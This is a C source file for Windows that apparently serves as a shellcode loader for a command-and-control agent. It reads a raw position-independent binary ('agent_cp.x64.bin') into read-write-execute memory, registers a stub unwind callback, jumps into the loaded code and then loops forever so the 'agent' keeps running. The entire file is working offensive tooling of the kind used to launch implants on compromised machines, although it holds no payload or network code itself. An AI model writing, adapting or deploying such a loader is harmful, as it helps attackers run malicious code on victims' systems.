#include <windows.h>
#include <stdio.h>

static PRUNTIME_FUNCTION pic_lookup(DWORD64 ControlPc, PVOID Context)
{
    (void) ControlPc;
    (void) Context;
    return NULL;
}

int main(int argc, char * argv[])
{
    const char * path = "agent_cp.x64.bin";
    if (argc > 1) path = argv[1];

    HANDLE hFile = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open %s (error %lu)\n", path, GetLastError());
        return 1;
    }

    DWORD size = GetFileSize(hFile, NULL);
    void * mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) {
        printf("[-] VirtualAlloc failed (error %lu)\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    DWORD bytesRead;
    ReadFile(hFile, mem, size, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Loaded %lu bytes at %p\n", bytesRead, mem);
    fflush(stdout);

    RtlInstallFunctionTableCallback(
        (DWORD64) mem | 0x3,
        (DWORD64) mem,
        bytesRead,
        pic_lookup,
        NULL, NULL);

    ((void (*)(void)) mem)();

    printf("[+] PIC returned, agent running\n");
    fflush(stdout);

    while (1) Sleep(10000);
    return 0;
}
